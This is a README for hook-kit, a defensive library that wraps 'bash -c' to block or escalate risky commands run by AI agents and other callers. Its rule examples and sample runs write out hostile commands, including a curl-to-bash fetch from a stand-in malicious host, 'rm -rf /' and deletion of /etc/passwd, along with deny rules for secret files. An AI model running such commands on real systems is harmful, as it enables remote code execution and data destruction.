# hook-kit

> Build agent-agnostic shell-wrapper hook binaries. Real shell-AST parsing, decisions via stdout/stderr/exit-code, no harness coupling.

`hook-kit` produces a single compiled binary (`hk`) that substitutes for `bash -c "<cmd>"`. Caller — agent, human, CI script, anything — runs commands through it; if a rule fires, the decision surfaces through the same shell I/O the caller already reads. No JSON wire protocol, no `hooks.json` configuration, no per-harness adapter required.

```typescript
import { createModule, cmd, pipe, redirect } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    { id: "force-push", name: "Block force push", events: ["PreToolUse"], matchers: ["Bash"] },
    [
      cmd("git", "push")
        .withFlag("--force")
        .withoutFlag("--force-with-lease")
        .deny("Use --force-with-lease, not raw --force"),
    ],
  ),
  createModule(
    { id: "rce", name: "Block remote code exec", events: ["PreToolUse"], matchers: ["Bash"] },
    [pipe(["curl", "wget"], ["bash", "sh", "zsh"]).deny("RCE via pipe-to-shell")],
  ),
  createModule(
    { id: "env", name: "Protect .env from redirects", events: ["PreToolUse"], matchers: ["Bash"] },
    [redirect(/\.env$/).deny("Don't redirect into .env")],
  ),
];
```

```bash
hook-kit build src/hooks.ts --out dist/hk          # adapter defaults to shell
```

```bash
$ dist/hk -c "git push --force origin main"
[hook-kit] denied: Use --force-with-lease, not raw --force
$ echo $?
2

$ dist/hk -c "ls -la /tmp"
total 24
drwxrwxrwt 1 root root 280 May 10 09:42 .
…
$ echo $?
0
```

That's it. The agent (or human, or CI) calls `dist/hk -c` instead of `bash -c`. Approved commands exec transparently — the caller sees their own output. Denied commands print a `[hook-kit]` marker and exit non-zero. Same protocol everywhere.

---

## Why agent-agnostic

Hooks are usually built around one specific harness (Claude Code's `hooks.json`, Cursor's tool-call config, etc.) — the gating logic gets duplicated everywhere it's needed because each integration point has its own protocol. hook-kit picks the one channel every caller already speaks: the shell.

- **No harness coupling.** The wrapper doesn't know if the caller is an AI agent, a human, a cron job, or a CI script. Same binary, same behavior.
- **Output convention is the contract.** Decisions ride on stdout / stderr / exit code. No JSON parser required to consume one. Works for shells, agents, log scrapers, monitoring, anything.
- **Real shell parsing.** `bash -c "rm -rf /"` recurses; `cmd1 | cmd2` is a BinaryCmd, not a substring; `> /etc/passwd` is a Stmt redir, not a `>` pattern. Built on `@questi0nm4rk/shell-ast`.
- **Optional adapter bins** for harnesses with non-shell tool channels (CC's `Edit` / `Write` / `Read`). Build a companion binary; wire it in `hooks.json`. The shell wrapper stays the primary gate.

---

## Install

```bash
bun add @questi0nm4rk/hook-kit
```

Requires Bun ≥ 1.2 (used as runtime, test runner, and binary compiler).

---

## Output convention

The contract every caller can rely on:

| Engine outcome | exit | stream | content |
|---|---|---|---|
| no terminal, no annotations | 0 | — | (silent, then exec the command verbatim — caller sees its own output) |
| no terminal, annotations only | exec's exit | **stdout** | one `<prefix> warning: <msg>` or `<prefix> note: <msg>` per annotation, `---` separator on its own line, exec's stdout below |
| `escalate` (needs review) | 1 | **stdout** | `<prefix> needs review: <reason>` + any accumulated annotations; command does NOT run |
| `deny` (hard block) | 2 | **stderr** | `<prefix> denied: <reason>` — annotations DROPPED |

`<prefix>` is the user-supplied decision label when set (e.g. `[my-plugin]`),
or `[hook-kit]` when no label is provided.

Approved commands run transparently. Denied commands never run. Escalated commands never run, but the warning goes to stdout (so a tail-the-output agent sees it without losing access to stderr for actual errors). Annotations (warning/note) are non-blocking — the command runs and its output flows below the `---` separator.

---

## Quick start

A minimal plugin from scratch:

```typescript
// my-plugin/src/hooks.ts
import { createModule, cmd, pipe, redirect } from "@questi0nm4rk/hook-kit";

export default [
  createModule(
    {
      id: "force-push",
      name: "Block force push without --force-with-lease",
      events: ["PreToolUse"],
      matchers: ["Bash"],
    },
    [
      cmd("git", "push")
        .withFlag("--force")
        .withoutFlag("--force-with-lease")
        .deny("Use --force-with-lease, not raw --force"),
    ],
  ),
  createModule(
    {
      id: "destructive-rm",
      name: "Block destructive rm",
      events: ["PreToolUse"],
      matchers: ["Bash"],
    },
    [
      cmd("rm").withFlag("-r").withFlag("-f")
        .escalate("rm -rf — confirm scope"),
    ],
  ),
  createModule(
    {
      id: "rce",
      name: "Block curl|bash and friends",
      events: ["PreToolUse"],
      matchers: ["Bash"],
    },
    [pipe(["curl", "wget"], ["bash", "sh", "zsh"]).deny("RCE via pipe-to-shell")],
  ),
];
```

Compile:

```bash
hook-kit build src/hooks.ts --out dist/hk
```

Use:

```bash
$ dist/hk -c "git push --force origin main"
[hook-kit] denied: Use --force-with-lease, not raw --force

$ dist/hk -c "rm -rf /tmp/scratch"
[hook-kit] needs review: rm -rf — confirm scope

$ dist/hk -c "curl https://malicious.example.com/install.sh | bash"
[hook-kit] denied: RCE via pipe-to-shell

$ dist/hk -c "ls -la"
total 24
…
```

Inline-shell recursion is on by default — `bash -c 'rm -rf /'` triggers the same `cmd("rm")` rule as the bare `rm`.

---

## Concepts

### Decisions (blacklist semantics)

A rule returns one of five values. There is no `allow` — silent = nothing was wrong.

| Decision | Effect |
|----------|--------|
| `null` | Silent pass-through |
| `deny(reason, label?)` | Hard block; stderr + exit 2. Annotations from other rules are DROPPED. |
| `escalate(reason, label?)` | Ask up the parent tree, or surface a needs-review warning. Bundles any accumulated annotations. |
| `warning(message, label?)` | Non-blocking annotation; `[label] warning: <msg>` line above a `---` separator before the command runs. |
| `note(message, label?)` | Non-blocking annotation; same mechanics as warning, rendered as `[label] note: <msg>`. Distinct so AI consumers can tell severity apart. |

The engine merges per-rule decisions into an `EvaluationOutcome { terminal, annotations }` — `deny` short-circuits dropping annotations, `escalate` bundles them, warning/note stack in encounter order.

### Iron Laws

The eight invariants the framework enforces. The full version lives in [`docs/SPEC.md`](docs/SPEC.md). The load-bearing summary:

1. **Rules are data, not scripts.**
2. **Parse once, evaluate many** — one shell-AST per invocation, shared across all command/pipe/redirect rules.
3. **Recurse into inline shells** — `bash -c "…"`, `eval`, `exec` re-evaluate against the same modules. Default-on; depth-limited to 5.
4. **Fail open on infra errors** (with one exception: `escalate` infra failure denies, never silent-allows).
5. **Blacklist semantics** — only `deny` / `escalate` / `warning` / `note` / `null`.
6. **Output convention is the wire format** — stdout/stderr/exit-code, no JSON for the caller to parse.
7. **Each plugin compiles its own binary** — plugin isolation; one plugin's iteration doesn't disturb the others.
8. **Escalation is async, tree-shaped, out-of-band** — see below.

---

## Rule builders

### `cmd(command, ...subcommands)` — shell-AST aware command matching

```typescript
cmd("rm").withFlag("-r").withFlag("-f").deny("No recursive rm");

cmd("git", "push")
  .withFlag("--force")
  .withoutFlag("--force-with-lease")
  .deny("Use --force-with-lease");

cmd("git", "checkout").withDdash().escalate("git checkout -- discards working tree");

cmd("gh", "api")
  .argMatches(/\/pulls\/\d+\/reviews/)
  .deny("Use the pr-review CLI for review operations");

cmd("gh", "api", "graphql")
  .withFlag("--field")
  .argMatches(/event=COMMENT/)
  .deny("Strict review forbids COMMENT-event reviews");
```

- **Variadic subcommands** match by position: `cmd("gh", "pr", "comment")` checks `args[0] === "pr" && args[1] === "comment"`.
- **`.withFlag("...")`** is alias-aware: `-r`, `-R`, and `--recursive` are interchangeable. Compound shorts like `-D` expand to `--delete + --force`.
- **`.argMatches(/regex/)`** searches all resolved args (including flag values like `event=COMMENT` from `--field event=COMMENT`). Quoted strings (`"…"`/`'…'`) become `<dynamic>` in shell-ast and never match.
- **`.withDdash()`** — require the POSIX `--` end-of-options separator. Lets `git checkout -- file` (destructive) be matched without false-flagging `git checkout main`.
- **`unwrapCall`** strips `sudo`/`doas`/`run0`/`su` automatically: `cmd("rm")` matches `sudo -u root rm /etc/passwd`.

### `pipe(from, into)` — pipe pattern detection

```typescript
pipe(["curl", "wget"], ["bash", "sh", "zsh", "ksh"]).deny("RCE via pipe-to-shell");
```

Walks AST `BinaryCmd` nodes for `|` and `|&` ops. Catches the canonical `curl … | bash` pattern that `cmd()` cannot express.

### `redirect(pathPattern?)` — write-redirect detection

```typescript
redirect(/\.env$/).deny("Don't redirect into .env");
redirect(/^\/etc\//).deny("Don't write to /etc");
redirect().deny("No shell redirects in this context");
```

Matches `>`, `>>`, `>|`, `&>`, `&>>` whose target matches `pathPattern`. Closes the bypass where `path()` rules can be sidestepped via `echo evil > /protected/path` in a Bash event. With no pattern, matches any write redirect.

### `path(pattern)` — file-path matching (cc-tools / library only)

```typescript
path(/\.generated\.cs$/).onWrite().deny("Edit the generator, not the output");
path(/\.env(\.|$)/).onRead().deny("Don't read environment files");
```

`onWrite()` matches `Write` + `Edit` + `NotebookEdit`. `onRead()` matches `Read`. Default (no chain) covers both. **Note:** these only fire under the cc-tools adapter or library mode — the shell wrapper synthesizes a Bash event and won't trigger path rules. For shell-side write protection use `redirect()`.

### `content()` — PostToolUse body inspection from disk (cc-tools / library only)

```typescript
content()
  .matchPath(/design\/.*\.md$/)
  .validate((filePath, body) => {
    const missing = REQUIRED_SECTIONS.filter((s) => !s.test(body));
    if (missing.length > 0) return warning(`Missing: ${missing.join(", ")}`);
    return null;
  });
```

Runs only on `PostToolUse` (the file is on disk after the tool ran). Same coverage caveat as `path()`.

### `stateful(id, fn)` — cross-invocation state

```typescript
stateful("repetition", (event, state) => {
  const key = `cmd:${(event.toolInput.command as string) ?? ""}`;
  const count = ((state.get(key) as number) ?? 0) + 1;
  state.set(key, count);
  if (count > 3) return warning(`Repeated ${count}× — break the loop?`);
  return null;
});
```

State persists across hook invocations within a session via the `TmpdirStore` (default) or any custom `StateStore` implementation.

### `custom(id, fn)` — escape hatch

```typescript
custom("session-summary", async (event) => {
  // arbitrary logic; throws are caught and treated as null (Iron Law 4)
  return null;
});
```

---

## Adapter bins (opt-in extensions)

For harnesses with non-shell tool channels, build a companion binary alongside `hk`:

```bash
hook-kit build src/hooks.ts --out dist/hk-cc-tools --adapter cc-tools \
  --hooks-json hooks/hooks.json --hook-timeout 10
```

Wires into Claude Code via `hooks.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Edit|Write|NotebookEdit|Read",
      "hooks": [{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools","timeout":10}]
    }],
    "PostToolUse": [{
      "matcher": "Edit|Write|NotebookEdit",
      "hooks": [{"type":"command","command":"${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools","timeout":10}]
    }]
  }
}
```

The two binaries cooperate. `hk` covers Bash; `hk-cc-tools` covers `Edit` / `Write` / `NotebookEdit` / `Read`. Same source, two builds.

Anyone can author additional adapter bins (`hk-cursor-tools`, `hk-opencode-tools`, …) — they're ~50 LOC of stdin/stdout glue around the engine.

---

## Escalation

When a rule returns `escalate`, the binary asks up the parent tree:

```
[ root: harness UI (CC's native ask) ]
            |
[ agent session ]
        |- [ subagent A ]
        |       |- [ sub-subagent ]
        |- [ subagent B ]
```

A request publishes at the hook's own session spool. A listener attached to that session — or any ancestor session up the chain — sees it. If a listener doesn't want to decide, it forwards via `--escalate-up` to the next level. When the chain exhausts at the root, it terminates at `harness-ask` (CC's native `permissionDecision: "ask"` UI takes over with no timeout).

**`HOOK_KIT_ASKPASS` unset** → no broker tree configured; the engine falls through to harness-ask immediately. Use this for simple "ask the user" hooks where you don't need a multi-agent escalation chain.

**`HOOK_KIT_ASKPASS` set** → routes through the configured askpass (default: `hook-kit broker --askpass`). The broker validates that a live listener exists somewhere in the chain (`NO PARENT ATTACHED`); broken infra denies (Iron Law 4 exception).

### The askpass contract

Any program that reads JSON on stdin and writes a decision to stdout is a valid askpass. Examples: `/bin/true` (always-allow), `/bin/false` (always-deny), a Slack-bridge, a GitHub-issue-bridge, the bundled broker.

The bundled `hook-kit broker --askpass` manages per-session ask channels at `~/.cache/hook-kit/sessions/$SESSION_ID/`:

```
sessions/abc-123/
├── meta.json            # {parent_session_id?, started_at, pid}
├── pending/<id>.json    # the envelope
├── decided/<id>.json    # the decision (first-writer-wins via O_EXCL)
├── listeners/<pid>.lock # liveness markers — one per attached listener
└── audit.jsonl          # append-only event log
```

### Listening with the TUI

```bash
hook-kit watch                         # all sessions on this host
hook-kit watch --children-of $MY_ID    # only descendants of a session you spawn
hook-kit watch --session abc-123       # one specific session
```

```
hook-kit watch                                3 pending  ·  1 listener attached

  SESSION             REQ-ID      AGE   TOOL      DETAILS
❯ abc-123             7f8a2b…     12s   Bash      git push --force origin main
  abc-123             3c4d5e…      3s   Write     /tmp/output.cs
  def-456             8b9c0a…      1m   Bash      rm -rf /tmp/scratch

  ┌─ details: 7f8a2b… ─────────────────────────────────────────
  │ harness:    claude-code
  │ project:    /home/me/proj
  │ git:        main (dirty) @ fc7f341  origin: git@github.com:o/r.git
  │ transcript: /tmp/cc-…/transcript.jsonl
  │ origin:     pid 41832 @ lab-01 (me)
  │ expires:    in 48s
  │ command:    git push --force origin main

↑↓/jk select  ·  allow  ·  deny  ·  escalate-up  ·  quit
```

Press `a` / `d` / `e` and the screen drops into a reason prompt.

### Listening programmatically

```bash
hook-kit subscribe --children-of $MY_SESSION_ID --json | while read req; do
  ID=$(jq -r .id <<<"$req")
  SESSION=$(jq -r .sessionId <<<"$req")
  hook-kit decide "$ID" --session "$SESSION" --allow --reason "in scope"
done
```

Or forward up the tree without deciding:

```bash
hook-kit decide "$ID" --session "$SESSION" --escalate-up
```

### Hook timeout

`hook-kit` doesn't enforce timeouts on its own. The only ceiling is the harness's hook timeout (when going through `hooks.json`). The build CLI requires `--hook-timeout` when emitting `hooks.json`:

```bash
hook-kit build … --hook-timeout 5      # plugins without escalate rules
hook-kit build … --hook-timeout 3600   # plugins where escalate may need a human
```

---

## CLI reference

```
hook-kit build <entrypoint> --out <path>
                            [--adapter shell|cc-tools]   (default: shell)
                            [--hooks-json <path>] [--binary-command <s>]
                            [--hook-timeout <seconds>]

hook-kit broker --askpass                  # the bundled default $HOOK_KIT_ASKPASS

hook-kit list [--children-of <id>] [--json]
hook-kit watch [--session <id>] [--children-of <id>] [--poll-ms <n>]
hook-kit subscribe [--session <id>] [--children-of <id>] [--poll-ms <n>] --json
hook-kit decide <request_id> --session <id>
                --allow | --deny | --escalate-up
                [--reason <text>] [--by <name>]

hook-kit --help
hook-kit --version
```

Compiled `hk` binary (built with `--adapter shell`):

```
hk -c "<command-string>"   # mirrors `bash -c`
hk -- <argv...>            # exec form
hk --version
hk --help
```

---

## Library mode

For consumers that want the engine and builders without the compiled-binary workflow:

```typescript
import { evaluate, createModule, cmd, type HookEvent } from "@questi0nm4rk/hook-kit";

const modules = buildModulesFromConfig(myConfig);
const event: HookEvent = parseMyHookInput(stdin);
const decision = await evaluate(event, modules);
// Map decision to your own output format.
```

The shell wrapper is also exported for in-process use:

```typescript
import { runShell } from "@questi0nm4rk/hook-kit/wrapper/hk";
import modules from "./hooks";

await runShell(modules);  // reads process.argv, evaluates, exits per the convention
```

The `raw` adapter and `run()` entry point exist for library consumers that want the full `read → evaluate → write` orchestration with their own I/O:

```typescript
import { rawAdapter, run } from "@questi0nm4rk/hook-kit";
import modules from "./hooks";

const { adapter, state } = rawAdapter(myEvent);
await run(modules, adapter);
console.log(state.decision);
```

---

## Observability

```bash
HOOK_KIT_VERBOSE=1 dist/hk -c "git push --force origin main" 2>&1 1>/dev/null
# [hook-kit] event=PreToolUse tool=Bash session=shell modules=3 → deny label=[force-push] reason="Use --force-with-lease, not raw --force" time=12ms
```

```bash
HOOK_KIT_ENRICH_GIT=1 dist/hk-cc-tools < hook-event.json
# Adds {sha, branch, dirty, remote} to escalation envelopes.
```

---

## Operational readiness

- **Observability:** `HOOK_KIT_VERBOSE=1` emits a single stderr trace line per evaluation (event, tool, session, module count, decision kind, label, reason, time). Each decision can carry a `label` for source attribution. Broker spool inspectable on disk: `cat ~/.cache/hook-kit/sessions/$SESSION_ID/audit.jsonl`. Git enrichment of escalation envelopes opts in via `HOOK_KIT_ENRICH_GIT=1`.
- **Failure modes:**
  - shell-AST WASM fails to load → all command/pipe/redirect rules return `null` (silent), stderr warning.
  - tmpdir/cache write fails → state lost, hook returns `null` (silent).
  - Rule throws → caught, treated as `null` (silent), logged.
  - Stdin empty/malformed (cc-tools adapter) → adapter exits 0 silent.
  - `escalate` without `HOOK_KIT_ASKPASS` set → falls through to harness-ask. The harness UI is itself a responder, so this is not silent-allow.
  - `escalate` with broken askpass infra (binary missing / non-zero exit / malformed output) → deny with `[hook-kit] askpass …`. Iron Law 4 exception.
  - `escalate` with broker `NO PARENT ATTACHED` → deny. Surfaces misconfigured plugins immediately instead of hanging on the hook timeout.
- **Deployment:** Compiled binary committed under the plugin (`dist/hk` for the wrapper, optionally `dist/hk-cc-tools` for the CC tool-call companion). For cc-tools, `hooks.json` points to `${CLAUDE_PLUGIN_ROOT}/dist/hk-cc-tools`. CI rebuilds on push. Plugin pins to `^major.minor`.
- **Rollback:** Delete the compiled binary; restore the previous version from git. Per-plugin binaries mean one broken plugin doesn't affect others.
- **CI gate:** `.github/workflows/test.yml` runs `bun install --frozen-lockfile` + `biome check` + `bun test` on push to main and every PR. Red CI = no merge.

---

## Explicit trade-offs

| Chose | Over | Because |
|---|---|---|
| Shell wrapper as the v0.3 default | Harness adapter as the default | Caller-agnostic by design — no JSON wire protocol with the harness, decisions surface through the same channel the caller already reads. Works for any caller that runs commands. |
| `pipe()` and `redirect()` as first-class builders | Express via `cmd()` | They can't be — different AST shapes (BinaryCmd, Stmt redirs). Necessary for canonical patterns (curl\|bash, cmd > .env). |
| Inline-shell recursion default-on | Opt-in | Without it every `cmd()` rule has a 1-line bypass via `bash -c "…"`. |
| Wrapper output convention (stdout/stderr/exit-code) | JSON output | The caller already reads shell I/O. No new parser needed to consume a decision. |
| Per-plugin binaries | One monolithic binary | Plugin isolation; independent release cycles. |
| Variadic `cmd(command, ...sub)` | Named or array sub | Most natural TypeScript API; covers single-level and multi-level subcommands. |
| Fail open on infra errors | Fail closed | Hook framework bugs must not block users. Security-critical rules belong in the harness's own deny list. |
| `HOOK_KIT_ASKPASS` unset → harness-ask fallthrough | Hard-deny on unset askpass | Most simple "ask the user" hooks don't need a broker tree. Iron-Law-4 fail-closed is preserved when broker infra is *expected* but broken. |
| Per-session ask channels | One global queue | Avoids cross-session noise when multiple sessions × subagents are active. Discovery via `meta.json` parent links. |
| Tree-shaped escalation with `escalate-up` forward | Auto-routing in the broker | Listeners explicitly choose to forward, matching the user's mental model. Synchronous forwarder, no daemon, audit trail per hop. |
| Filesystem spool inside the broker | Socket-only or HTTP | Inspectable, crash-safe, atomic via `rename(2)`, no daemon strictly required. |
| Askpass as the public escalation contract | A dedicated socket protocol | Decades of prior art (sudo, ssh, git, gpg). Any binary can be a responder. |
| Blacklist semantics | Whitelist | Matches harness behavior. One block wins regardless of others. |
| No default `--hook-timeout` | Sensible default like 65s or 3600s | Either default has a wrong tail. Forcing the plugin author to pick makes the trade-off explicit at build time. |

---

## Change triggers

The design assumes the following. If any of them changes, revisit the noted area.

- **Assumes:** Every caller that needs gating shells out for the action it cares about. **If** a target harness has a critical action that bypasses the shell entirely with no equivalent tool event (no `Edit`/`Write`/`Read`-style hook channel either) → the shell wrapper alone gives no coverage; either build a custom adapter bin for that harness's channel or accept the gap. Document explicitly.
- **Assumes:** shell-AST can parse Bash / POSIX / mksh dialects with sufficient fidelity for rule matching. **If** a target shell (fish, nushell, PowerShell) becomes a primary integration → shell-ast may not cover it; either contribute parsing or use a different parser layer. Rules built on AST traversal would need to be reconfirmed.
- **Assumes:** Cold start ~50ms is fast enough for the wrapper to sit in front of every command. **If** a profile shows the wrapper adds noticeable latency to interactive use → drop the bytecode build (`bun build --compile` without `--bytecode`) or split the engine into a long-running daemon spoken to over a socket. Output convention stays the same.
- **Assumes:** `HOOK_KIT_ASKPASS` unset → harness-ask is acceptable as the default. **If** a deployment context demands hard-deny on missing infra (e.g. CI where there's no human to answer) → set `HOOK_KIT_ASKPASS=/bin/false` explicitly. This is a deployment-time decision, not a code change.
- **Assumes:** Escalation is rare (the broker tree is invoked only on `escalate` decisions, not on every command). **If** a plugin starts using `escalate` for the common path → either revisit the rule (most "ask" use cases should be `deny` with a clear remediation, or `warning` / `note` with informational messaging) or expect operational complexity from broker setup.
- **Assumes:** Per-plugin compiled binaries are acceptable disk footprint (~50 MB each). **If** disk pressure becomes an issue (e.g. many plugins on a small system) → drop bytecode (smaller binary, slower start) or move to a shared runtime model.
- **Assumes:** The output convention `stderr+exit-2` for deny / `stdout+exit-1` for escalate is unambiguous downstream. **If** a caller can't distinguish those (e.g. captures only one stream, or treats any non-zero as fatal) → it'll lose the deny/escalate distinction. Document the contract explicitly in any wrapper docs the caller might use.
- **Assumes:** Iron Laws hold without weakening. **If** any future feature would require fail-closed behavior on a non-escalate path (e.g. mandatory whitelist mode) → that's a new mode, not an extension of the current one. Spec it as a separate decision kind, not by reweighing the existing fail-open semantics.

---

## Architecture

The full architecture lives in [`docs/SPEC.md`](docs/SPEC.md). One-page summary:

```
src/
├── core/         types.ts, decision.ts, event.ts, module.ts
├── rules/        cmd(), path(), pipe(), redirect(), content(), custom(), stateful()
├── engine/       evaluate() loop + helpers (flag aliases, inline-shell extraction)
├── wrapper/      hk.ts — runShell() (the v0.3 default)
├── adapters/     ProtocolAdapter: claude-code (cc-tools), raw
├── state/        StateStore: memory-store, tmpdir-store
├── escalation/   askpass, broker, envelope, forward, listeners, watch-tui, enrich-git
└── build/        hook-kit CLI: build, broker, watch, subscribe, decide, list
```

---

## Examples

`examples/ai-guardrails/` is a faithful port of [ai-guardrails](https://github.com/Questi0nM4rk/ai-guardrails) — six rule groups (destructive-rm, git-force-push, git-destructive, git-bypass-hooks, chmod-world-writable, remote-code-exec), path/redirect protection, and suppress-comments — built as both `dist/hk` and `dist/hk-cc-tools`.

```bash
cd examples/ai-guardrails
bun install
bun run build      # produces dist/hk + dist/hk-cc-tools
```

See [`examples/ai-guardrails/README.md`](examples/ai-guardrails/README.md) for the rule list and integration walkthrough.

---

## Testing

`hook-kit` ships with 276 tests across 25 files covering rule builders (incl. pipe / redirect / withDdash), the engine (incl. inline-shell recursion + depth limit), the shell wrapper output convention, the cc-tools adapter, both state stores, the entire escalation system (envelope schemas, askpass child-process invocation, broker spool atomicity, listener marker liveness, NO PARENT ATTACHED validator, escalate-up forwarding, the TUI render function), git enrichment, and a real compile + execute end-to-end smoke for both binary modes.

```bash
bun test                          # run everything (~3 seconds including binary builds)
bun test tests/escalation         # one directory
bun test --grep "shortCircuit"    # by name
```

CI gate (`.github/workflows/test.yml`) runs `biome check` + `bun test` on push to main and every PR.

---

## Status

Pre-release (`0.x`). Current: `0.3.0`. The shell-wrapper API + output convention is intended to stabilize toward `1.0`. Adapter-bin shape (CC, future Cursor / OpenCode / KiloCode) and broker spool layout are stable across `0.x`.

Published to npm as [`@questi0nm4rk/hook-kit`](https://www.npmjs.com/package/@questi0nm4rk/hook-kit).

---

## License

MIT — see [LICENSE](LICENSE).
